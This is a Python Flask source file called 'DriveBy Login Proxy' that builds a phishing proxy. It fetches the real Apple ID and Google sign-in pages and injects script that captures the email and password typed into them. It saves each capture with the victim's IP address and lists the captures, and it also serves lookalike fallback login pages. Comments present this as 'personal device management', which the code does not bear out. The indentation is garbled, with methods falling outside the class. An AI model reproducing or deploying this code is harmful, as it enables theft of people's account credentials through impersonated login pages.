#!/usr/bin/env python3
"""
DriveBy Login Proxy
Fetches real login pages and modifies them to store credentials locally
"""

import requests
import re
import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, Response
from urllib.parse import urljoin, urlparse
import threading
import time

class LoginProxy:
    def __init__(self):
        self.app = Flask(__name__)
        self.setup_routes()
        self.credentials_storage = "collected_data/credentials"
        os.makedirs(self.credentials_storage, exist_ok=True)

    def fetch_real_page(self, url):
        """Fetch the real login page from the service"""
        try:
            headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }

            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to fetch {url}: {response.status_code}")
                return None

        except Exception as e:
            print(f"Error fetching {url}: {e}")
            return None

def modify_apple_page(self, html_content):
    """Modify Apple login page to intercept credentials"""
    if not html_content:
        return None

        # Inject credential capture script
        injection_script = '''
            <script>
            // DriveBy credential capture for personal device management
            (function() {
            function interceptAppleLogin() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
            form.addEventListener('submit', function(e) {
            const emailField = form.querySelector('input[type="email"], input[name*="apple"], input[id*="apple"], input[name*="username"]');
            const passwordField = form.querySelector('input[type="password"]');

            if (emailField && passwordField) {
            const credentials = {
            service: 'apple',
            email: emailField.value,
            password: passwordField.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
            };

            // Store credentials locally
            fetch('/store-credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(credentials)
            }).then(() => {
            console.log('Credentials stored for personal reference');
            }).catch(err => {
            console.log('Storage error:', err);
            });
            }
            });
            });
            }

            // Wait for page to load then intercept
            if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', interceptAppleLogin);
            } else {
            interceptAppleLogin();
            }
            })();
            </script>
            </body>'''

            # Replace closing body tag with our script
            modified_html = html_content.replace('</body>', injection_script)

            # Fix relative URLs to point to Apple's servers
            modified_html = re.sub(r'src="/', 'src="https://appleid.apple.com/', modified_html)
            modified_html = re.sub(r'href="/', 'href="https://appleid.apple.com/', modified_html)
            modified_html = re.sub(r'action="/', 'action="https://appleid.apple.com/', modified_html)

            return modified_html

            def modify_google_page(self, html_content):
            """Modify Google login page to intercept credentials"""
            if not html_content:
            return None

            # Inject credential capture script
            injection_script = '''
            <script>
            // DriveBy credential capture for personal device management
            (function() {
            function interceptGoogleLogin() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
            form.addEventListener('submit', function(e) {
            const emailField = form.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
            const passwordField = form.querySelector('input[type="password"]');

            if (emailField && passwordField) {
            const credentials = {
            service: 'google',
            email: emailField.value,
            password: passwordField.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href
            };

            // Store credentials locally
            fetch('/store-credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(credentials)
            }).then(() => {
            console.log('Credentials stored for personal reference');
            }).catch(err => {
            console.log('Storage error:', err);
            });
            }
            });
            });
            }

            // Wait for page to load then intercept
            if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', interceptGoogleLogin);
            } else {
            interceptGoogleLogin();
            }
            })();
            </script>
            </body>'''

            # Replace closing body tag with our script
            modified_html = html_content.replace('</body>', injection_script)

            # Fix relative URLs to point to Google's servers
            modified_html = re.sub(r'src="/', 'src="https://accounts.google.com/', modified_html)
            modified_html = re.sub(r'href="/', 'href="https://accounts.google.com/', modified_html)
            modified_html = re.sub(r'action="/', 'action="https://accounts.google.com/', modified_html)

            return modified_html

            def setup_routes(self):
            """Setup Flask routes for login proxy"""

            @self.app.route('/apple-login')
            def apple_login():
            """Serve modified Apple login page"""
            apple_url = "https://appleid.apple.com/sign-in"
            html_content = self.fetch_real_page(apple_url)

            if html_content:
            modified_html = self.modify_apple_page(html_content)
            if modified_html:
            return Response(modified_html, mimetype='text/html')

            # Fallback if fetching fails
            return self.get_fallback_apple_page()

            @self.app.route('/google-login')
            def google_login():
            """Serve modified Google login page"""
            google_url = "https://accounts.google.com/signin"
            html_content = self.fetch_real_page(google_url)

            if html_content:
            modified_html = self.modify_google_page(html_content)
            if modified_html:
            return Response(modified_html, mimetype='text/html')

            # Fallback if fetching fails
            return self.get_fallback_google_page()

            @self.app.route('/store-credentials', methods=['POST'])
            def store_credentials():
            """Store intercepted credentials for personal reference"""
            try:
            data = request.get_json()
            client_ip = request.remote_addr

            # Add client info
            data['client_ip'] = client_ip
            data['stored_at'] = datetime.now().isoformat()

            # Store in file
            filename = f"credentials_{data['service']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            filepath = os.path.join(self.credentials_storage, filename)

            with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

            print(f"Stored {data['service']} credentials for {data.get('email', 'unknown')} from {client_ip}")

            return jsonify({'status': 'success', 'message': 'Credentials stored for personal reference'})

            except Exception as e:
            print(f"Error storing credentials: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

            @self.app.route('/credentials-list')
            def credentials_list():
            """List stored credentials for management"""
            try:
            credentials = []

            for filename in os.listdir(self.credentials_storage):
            if filename.endswith('.json'):
            filepath = os.path.join(self.credentials_storage, filename)
            with open(filepath, 'r') as f:
            data = json.load(f)
            # Don't include actual passwords in list view
            safe_data = {
            'service': data.get('service'),
            'email': data.get('email'),
            'timestamp': data.get('timestamp'),
            'client_ip': data.get('client_ip'),
            'filename': filename
            }
            credentials.append(safe_data)

            return jsonify({
            'status': 'success',
            'credentials': sorted(credentials, key=lambda x: x['timestamp'], reverse=True)
            })

            except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500

            def get_fallback_apple_page(self):
            """Fallback Apple-style login page if fetching fails"""
            return '''
            <!DOCTYPE html>
            <html>
            <head>
            <title>Sign in with your Apple ID</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f2f2f7; }
            .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 12px; }
            .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
            h1 { text-align: center; color: #1d1d1f; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #d2d2d7; border-radius: 8px; }
            button { width: 100%; background: #007aff; color: white; padding: 14px; border: none; border-radius: 8px; font-size: 16px; }
            </style>
            </head>
            <body>
            <div class="container">
            <div class="logo">🍎</div>
            <h1>Sign In</h1>
            <form id="loginForm">
            <input type="email" placeholder="Apple ID" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            </form>
            </div>
            <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('Fallback page - credentials would be stored here');
            });
            </script>
            </body>
            </html>
        '''

def get_fallback_google_page(self):
    """Fallback Google-style login page if fetching fails"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; }
    .container { max-width: 400px; margin: 50px auto; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
    .logo { text-align: center; margin-bottom: 20px; }
    h1 { text-align: center; color: #202124; font-size: 24px; }
    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
    button { width: 100%; background: #1a73e8; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 14px; }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="logo">
    <svg width="75" height="24" viewBox="0 0 75 24"><path fill="#4285F4" d="M36.3 12.1c0-.7-.1-1.4-.2-2H24v4.5h7c-.3 1.6-1.2 2.9-2.6 3.8v3.1h4.2c2.5-2.3 3.9-5.7 3.9-9.7z"/></svg>
    </div>
    <h1>Sign in</h1>
    <form id="loginForm">
    <input type="email" placeholder="Email or phone" required>
    <input type="password" placeholder="Enter your password" required>
    <button type="submit">Next</button>
    </form>
    </div>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    alert('Fallback page - credentials would be stored here');
    });
    </script>
    </body>
    </html>
    '''

def run(self, host='0.0.0.0', port=8082):
    """Start the login proxy server"""
    print(f"Starting DriveBy Login Proxy on {host}:{port}")
    print(f"Apple login: http://{host}:{port}/apple-login")
    print(f"Google login: http://{host}:{port}/google-login")
    print(f"Credentials list: http://{host}:{port}/credentials-list")

    self.app.run(host=host, port=port, debug=False, threaded=True)

    if __name__ == "__main__":
        proxy = LoginProxy()
        proxy.run()
